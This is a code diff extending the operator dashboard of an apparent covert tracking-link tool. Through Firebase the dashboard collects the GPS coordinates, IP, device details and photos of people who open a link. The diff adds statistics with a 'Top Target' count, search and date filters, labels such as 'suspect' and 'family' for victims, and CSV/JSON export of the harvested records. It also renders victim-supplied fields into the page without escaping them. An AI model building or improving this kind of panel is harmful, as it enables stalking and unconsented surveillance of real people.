@@ -46,8 +46,18 @@
       padding-bottom: 10px;
       margin-bottom: 15px;
       text-shadow: 0 0 10px #00ff9d;
+      gap: 8px;
     }
-    .header h1 { font-size: 13px; letter-spacing: 2px; }
+    .header h1 { font-size: 12px; letter-spacing: 2px; }
+    .header-center {
+      font-size: 11px;
+      color: #7dfcce;
+      letter-spacing: 1.5px;
+      text-shadow: 0 0 5px #00ff9d;
+      flex: 1;
+      text-align: center;
+      font-weight: bold;
+    }
     #logout {
       padding: 6px 10px;
       background: transparent;
@@ -100,7 +110,7 @@
     .label { font-size: 10px; letter-spacing: 2px; color: #7dfcce; margin-bottom: 8px; }
 
     .input-row { display: flex; gap: 6px; align-items: center; }
-    input {
+    input, select {
       flex: 1;
       padding: 10px 12px;
       background: rgba(0,255,157,0.05);
@@ -114,7 +124,17 @@
       transition: all 0.3s;
     }
     input::placeholder { color: rgba(0,255,157,0.4); }
-    input:focus { box-shadow: 0 0 12px #00ff9d; background: rgba(0,255,157,0.1); }
+    input:focus, select:focus { box-shadow: 0 0 12px #00ff9d; background: rgba(0,255,157,0.1); }
+    select {
+      cursor: pointer;
+      appearance: none;
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2300ff9d' stroke-width='2'%3e%3cpolyline points='6 9 12 15 18 9'/%3e%3c/svg%3e");
+      background-repeat: no-repeat;
+      background-position: right 8px center;
+      background-size: 16px;
+      padding-right: 30px;
+    }
+    select option { background: #0a0e14; color: #00ff9d; }
     button.gen {
       padding: 10px 14px;
       background: transparent;
@@ -170,6 +190,85 @@
     }
     .btn-copy:hover { box-shadow: 0 0 20px #00ff9d; transform: scale(1.02); }
     .btn-copy.copied { background: #00d4ff; }
+
+    /* ===== STATISTIK ===== */
+    .stats-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 8px;
+      margin-bottom: 5px;
+    }
+    .stat-card {
+      background: rgba(0,255,157,0.06);
+      border: 1px solid rgba(0,255,157,0.3);
+      border-radius: 5px;
+      padding: 12px 8px;
+      text-align: center;
+      position: relative;
+    }
+    .stat-icon { font-size: 16px; margin-bottom: 4px; }
+    .stat-value {
+      font-size: 18px;
+      font-weight: bold;
+      color: #00ff9d;
+      text-shadow: 0 0 10px #00ff9d;
+      letter-spacing: 1px;
+    }
+    .stat-label {
+      font-size: 8px;
+      color: #7dfcce;
+      letter-spacing: 1.5px;
+      margin-top: 4px;
+      text-transform: uppercase;
+    }
+
+    /* ===== SEARCH & FILTER ===== */
+    .search-row {
+      display: flex;
+      gap: 6px;
+      margin-bottom: 10px;
+      flex-wrap: wrap;
+    }
+    .search-row input { flex: 2; min-width: 150px; }
+    .search-row select { flex: 1; min-width: 100px; }
+    .search-info {
+      font-size: 10px;
+      color: #7dfcce;
+      letter-spacing: 1px;
+      margin-bottom: 10px;
+      padding: 5px 0;
+    }
+    .search-info b { color: #00ff9d; text-shadow: 0 0 5px #00ff9d; }
+
+    /* ===== EXPORT ===== */
+    .export-row {
+      display: flex;
+      gap: 6px;
+      margin-top: 12px;
+      padding-top: 12px;
+      border-top: 1px solid rgba(0,255,157,0.3);
+    }
+    .btn-export {
+      flex: 1;
+      padding: 10px;
+      background: transparent;
+      border: 1px solid #00d4ff;
+      color: #00d4ff;
+      font-family: 'Courier New', monospace;
+      font-size: 11px;
+      font-weight: bold;
+      letter-spacing: 1.5px;
+      cursor: pointer;
+      border-radius: 3px;
+      transition: all 0.3s;
+      text-shadow: 0 0 5px #00d4ff;
+    }
+    .btn-export:hover {
+      background: #00d4ff;
+      color: #0a0e14;
+      box-shadow: 0 0 15px #00d4ff;
+      text-shadow: none;
+    }
 
     .notif-toggle {
       padding: 5px 10px;
@@ -381,8 +480,57 @@
       border-bottom: 1px dashed rgba(0,255,157,0.4);
       margin-bottom: 12px;
       text-shadow: 0 0 5px #00ff9d;
+      gap: 8px;
+      flex-wrap: wrap;
     }
     .card-top .id-code { color: #7dfcce; }
+    .card-tag {
+      display: inline-block;
+      padding: 2px 8px;
+      background: rgba(255,51,102,0.2);
+      border: 1px solid #ff3366;
+      color: #ff3366;
+      font-size: 8px;
+      letter-spacing: 1px;
+      border-radius: 10px;
+      margin-left: 5px;
+      text-shadow: 0 0 5px #ff3366;
+    }
+    .card-tag.vip { background: rgba(255,204,0,0.2); border-color: #ffcc00; color: #ffcc00; text-shadow: 0 0 5px #ffcc00; }
+    .card-tag.family { background: rgba(0,212,255,0.2); border-color: #00d4ff; color: #00d4ff; text-shadow: 0 0 5px #00d4ff; }
+    .card-tag.suspect { background: rgba(255,51,102,0.2); border-color: #ff3366; color: #ff3366; text-shadow: 0 0 5px #ff3366; }
+    .card-tag.friend { background: rgba(0,255,157,0.2); border-color: #00ff9d; color: #00ff9d; text-shadow: 0 0 5px #00ff9d; }
+
+    .tag-selector {
+      margin-top: 8px;
+      padding-top: 8px;
+      border-top: 1px dashed rgba(0,255,157,0.3);
+      display: flex;
+      gap: 5px;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+    .tag-selector .tag-lbl {
+      font-size: 8px;
+      color: #7dfcce;
+      letter-spacing: 1.5px;
+      margin-right: 5px;
+    }
+    .tag-btn {
+      padding: 3px 8px;
+      background: transparent;
+      border: 1px solid rgba(0,255,157,0.4);
+      color: #7dfcce;
+      font-family: 'Courier New', monospace;
+      font-size: 8px;
+      letter-spacing: 0.5px;
+      cursor: pointer;
+      border-radius: 10px;
+      transition: all 0.3s;
+    }
+    .tag-btn:hover { background: rgba(0,255,157,0.15); border-color: #00ff9d; color: #00ff9d; }
+    .tag-btn.active { background: #00ff9d; color: #0a0e14; border-color: #00ff9d; }
+
     .card-photo-wrap { position: relative; width: 100%; margin-bottom: 14px; }
     .card-photo {
       width: 100%;
@@ -551,7 +699,8 @@
   <div class="scanline"></div>
   <div class="wrap">
     <div class="header">
-      <h1>[ CYBER ANONYMOUS ]</h1>
+      <h1>[ CYBER ]</h1>
+      <div class="header-center" id="liveClock">--:--:--</div>
       <button id="logout" onclick="logout()">LOGOUT</button>
     </div>
 
@@ -579,6 +728,27 @@
     </div>
 
     <div class="box">
+      <div class="box-title">» STATISTIK</div>
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-icon">📊</div>
+          <div class="stat-value" id="statTotal">0</div>
+          <div class="stat-label">Total Data</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-icon">📅</div>
+          <div class="stat-value" id="statToday">0</div>
+          <div class="stat-label">Hari Ini</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-icon">🏆</div>
+          <div class="stat-value" id="statTop">-</div>
+          <div class="stat-label">Top Target</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="box">
       <div class="box-title">» GENERATE TRACKING LINK</div>
       <div class="label">TARGET NAME:</div>
       <div class="input-row">
@@ -599,7 +769,24 @@
         » INCOMING DATA
         <button class="btn-clear-all" onclick="clearAll()">🗑️ HAPUS SEMUA</button>
       </div>
+
+      <div class="search-row">
+        <input id="searchInput" placeholder="🔍 Cari target..." oninput="filterData()">
+        <select id="filterDate" onchange="filterData()">
+          <option value="all">Semua</option>
+          <option value="today">Hari Ini</option>
+          <option value="7days">7 Hari</option>
+          <option value="30days">30 Hari</option>
+        </select>
+      </div>
+      <div class="search-info" id="searchInfo">Menampilkan <b id="countShown">0</b> dari <b id="countTotal">0</b> data</div>
+
       <div id="hasil"><span class="empty">Waiting for data...</span></div>
+
+      <div class="export-row">
+        <button class="btn-export" onclick="exportCSV()">📥 EXPORT CSV</button>
+        <button class="btn-export" onclick="exportJSON()">📥 EXPORT JSON</button>
+      </div>
     </div>
   </div>
 
@@ -624,11 +811,26 @@ const user = localStorage.getItem('username');
 if (!user) location.href = 'index.html';
 document.getElementById('u').innerText = user;
 
+let allData = [];
+let allDataRaw = {};
+
 window.logout = () => {
   localStorage.removeItem('username');
   location.href = 'index.html';
 };
 
+// ===== JAM DIGITAL LIVE =====
+function updateClock() {
+  const now = new Date();
+  const h = String(now.getHours()).padStart(2,'0');
+  const m = String(now.getMinutes()).padStart(2,'0');
+  const s = String(now.getSeconds()).padStart(2,'0');
+  document.getElementById('liveClock').innerText = `${h}:${m}:${s}`;
+}
+setInterval(updateClock, 1000);
+updateClock();
+
+// ===== NOTIFIKASI =====
 let notifEnabled = false;
 let lastDataCount = 0;
 let firstLoad = true;
@@ -709,6 +911,8 @@ window.clearAll = async () => {
   if (!confirm('Yakin hapus SEMUA data? Tidak bisa dikembalikan.')) return;
   try {
     await remove(ref(db, 'lokasi/' + user));
+    allData = [];
+    allDataRaw = {};
     lastDataCount = 0;
     alert('✓ Semua data dihapus');
   } catch(e) {
@@ -784,29 +988,191 @@ function generateID(waktu) {
   return `TGT-${y}${m}${d}-${h}${mn}${s}`;
 }
 
+// ===== LABEL / TAG =====
+function getTag(key) {
+  return localStorage.getItem('tag_' + user + '_' + key) || '';
+}
+
+window.setTag = (key, tag) => {
+  const current = getTag(key);
+  if (current === tag) {
+    localStorage.removeItem('tag_' + user + '_' + key);
+  } else {
+    localStorage.setItem('tag_' + user + '_' + key, tag);
+  }
+  renderData();
+};
+
+function tagBadge(key) {
+  const tag = getTag(key);
+  if (!tag) return '';
+  return `<span class="card-tag ${tag}">${tag.toUpperCase()}</span>`;
+}
+
+function tagSelector(key) {
+  const current = getTag(key);
+  const tags = ['vip', 'suspect', 'family', 'friend'];
+  return `
+    <div class="tag-selector">
+      <span class="tag-lbl">🏷️ LABEL:</span>
+      ${tags.map(t => `
+        <button class="tag-btn ${current === t ? 'active' : ''}" onclick="setTag('${key}', '${t}')">${t.toUpperCase()}</button>
+      `).join('')}
+    </div>
+  `;
+}
+
+// ===== SEARCH & FILTER =====
+window.filterData = () => {
+  renderData();
+};
+
+function getFilteredData() {
+  const search = (document.getElementById('searchInput')?.value || '').toLowerCase().trim();
+  const dateFilter = document.getElementById('filterDate')?.value || 'all';
+
+  const now = new Date();
+  const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
+
+  return allData.filter(([key, d]) => {
+    // Filter search
+    if (search) {
+      const targetName = (d.target || '').toLowerCase();
+      const kota = (d.kota || '').toLowerCase();
+      const ip = (d.ip || '').toLowerCase();
+      if (!targetName.includes(search) && !kota.includes(search) && !ip.includes(search)) {
+        return false;
+      }
+    }
+
+    // Filter tanggal
+    if (dateFilter === 'today') {
+      if (d.waktu < todayStart) return false;
+    } else if (dateFilter === '7days') {
+      if (d.waktu < todayStart - 7 * 24 * 60 * 60 * 1000) return false;
+    } else if (dateFilter === '30days') {
+      if (d.waktu < todayStart - 30 * 24 * 60 * 60 * 1000) return false;
+    }
+
+    return true;
+  });
+}
+
+// ===== STATISTIK =====
+function updateStats() {
+  const total = allData.length;
+  const now = new Date();
+  const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
+  const today = allData.filter(([k,d]) => d.waktu >= todayStart).length;
+
+  // Hitung top target
+  const counter = {};
+  allData.forEach(([k,d]) => {
+    const t = d.target || 'Unknown';
+    counter[t] = (counter[t] || 0) + 1;
+  });
+  let topTarget = '-';
+  let topCount = 0;
+  for (const [name, count] of Object.entries(counter)) {
+    if (count > topCount) {
+      topCount = count;
+      topTarget = name;
+    }
+  }
+
+  document.getElementById('statTotal').innerText = total;
+  document.getElementById('statToday').innerText = today;
+  document.getElementById('statTop').innerText = topTarget !== '-' ? topTarget.substring(0, 8) : '-';
+}
+
+// ===== EXPORT =====
+window.exportCSV = () => {
+  if (allData.length === 0) {
+    alert('Tidak ada data untuk di-export');
+    return;
+  }
+
+  const headers = ['ID', 'Target', 'Waktu', 'Kota', 'Lat', 'Lng', 'IP', 'Suhu', 'Baterai', 'Platform', 'Jaringan', 'Timezone', 'Akurasi', 'Sumber'];
+  const rows = allData.map(([key, d]) => [
+    generateID(d.waktu),
+    d.target || '',
+    new Date(d.waktu).toLocaleString('id-ID'),
+    d.kota || '',
+    d.lat || '',
+    d.lng || '',
+    d.ip || '',
+    d.suhu || '',
+    d.baterai || '',
+    d.platform || '',
+    d.network || '',
+    d.timezone || '',
+    d.akurasi || '',
+    d.sumber || ''
+  ]);
+
+  const csv = [
+    headers.join(','),
+    ...rows.map(r => r.map(c => `"${String(c).replace(/"/g, '""')}"`).join(','))
+  ].join('\n');
+
+  const blob = new Blob(['\ufeff' + csv], { type: 'text/csv;charset=utf-8;' });
+  const link = document.createElement('a');
+  link.download = `cyber_data_${Date.now()}.csv`;
+  link.href = URL.createObjectURL(blob);
+  link.click();
+  URL.revokeObjectURL(link.href);
+};
+
+window.exportJSON = () => {
+  if (allData.length === 0) {
+    alert('Tidak ada data untuk di-export');
+    return;
+  }
+
+  // Hapus foto dari JSON (biar file kecil)
+  const dataExport = allData.map(([key, d]) => {
+    const copy = { ...d };
+    if (copy.foto) copy.foto = '[FOTO_BASE64_DIHAPUS]';
+    return copy;
+  });
+
+  const json = JSON.stringify({
+    user: user,
+    exported: new Date().toLocaleString('id-ID'),
+    total: dataExport.length,
+    data: dataExport
+  }, null, 2);
+
+  const blob = new Blob([json], { type: 'application/json;charset=utf-8;' });
+  const link = document.createElement('a');
+  link.download = `cyber_data_${Date.now()}.json`;
+  link.href = URL.createObjectURL(blob);
+  link.click();
+  URL.revokeObjectURL(link.href);
+};
+
+// ===== MAP =====
 let currentMap = null;
 let currentMarker = null;
 
-onValue(ref(db, 'lokasi/' + user), snap => {
-  const data = snap.val();
-  if (!data) {
-    document.getElementById('hasil').innerHTML = '<span class="empty">Waiting for data...</span>';
+// ===== RENDER DATA =====
+function renderData() {
+  const filtered = getFilteredData();
+  const container = document.getElementById('hasil');
+
+  document.getElementById('countShown').innerText = filtered.length;
+  document.getElementById('countTotal').innerText = allData.length;
+
+  if (filtered.length === 0) {
+    container.innerHTML = '<span class="empty">Tidak ada data yang cocok</span>';
     if (currentMap) { try { currentMap.remove(); } catch(e){} currentMap = null; }
-    lastDataCount = 0;
     return;
   }
-  const arr = Object.entries(data).sort((a,b) => b[1].waktu - a[1].waktu);
 
-  if (!firstLoad && arr.length > lastDataCount) {
-    playAlertSound();
-  }
-  lastDataCount = arr.length;
-  firstLoad = false;
-
-  document.getElementById('hasil').innerHTML = arr.map(([key, d], index) => `
+  container.innerHTML = filtered.map(([key, d], index) => `
     <div class="card-target" id="card-${key}">
       <div class="card-top">
-        <span>ID: <span class="id-code">${generateID(d.waktu)}</span></span>
+        <span>ID: <span class="id-code">${generateID(d.waktu)}</span>${tagBadge(key)}</span>
         <span>${new Date(d.waktu).toLocaleString('id-ID')}</span>
       </div>
 
@@ -844,6 +1210,8 @@ onValue(ref(db, 'lokasi/' + user), snap => {
         <div class="card-name-value">${d.target || 'UNKNOWN'}</div>
       </div>
 
+      ${tagSelector(key)}
+
       <div class="card-data">
         ${d.lat ? `
           <div class="card-row"><span class="cico">📍</span><span class="clbl">Lokasi</span><span class="cval">${d.kota || ''} ${d.lat.toFixed(4)}, ${d.lng.toFixed(4)}</span></div>
@@ -873,12 +1241,40 @@ onValue(ref(db, 'lokasi/' + user), snap => {
     </div>
   `).join('');
 
-  const terbaru = arr[0][1];
+  const terbaru = filtered[0][1];
   if (terbaru && terbaru.lat && document.getElementById('map')) {
-    setTimeout(() => initMapAnimation(terbaru.lat, terbaru.lng, arr[0][0]), 200);
+    setTimeout(() => initMapAnimation(terbaru.lat, terbaru.lng, filtered[0][0]), 200);
   }
+}
+
+// ===== FIREBASE LISTENER =====
+onValue(ref(db, 'lokasi/' + user), snap => {
+  const data = snap.val();
+  if (!data) {
+    allData = [];
+    allDataRaw = {};
+    lastDataCount = 0;
+    document.getElementById('hasil').innerHTML = '<span class="empty">Waiting for data...</span>';
+    document.getElementById('countShown').innerText = '0';
+    document.getElementById('countTotal').innerText = '0';
+    updateStats();
+    if (currentMap) { try { currentMap.remove(); } catch(e){} currentMap = null; }
+    return;
+  }
+  allDataRaw = data;
+  allData = Object.entries(data).sort((a,b) => b[1].waktu - a[1].waktu);
+
+  if (!firstLoad && allData.length > lastDataCount) {
+    playAlertSound();
+  }
+  lastDataCount = allData.length;
+  firstLoad = false;
+
+  updateStats();
+  renderData();
 });
 
+// ===== MAP ANIMATION =====
 function initMapAnimation(lat, lng, key) {
   if (currentMap) {
     try { currentMap.remove(); } catch(e) {}
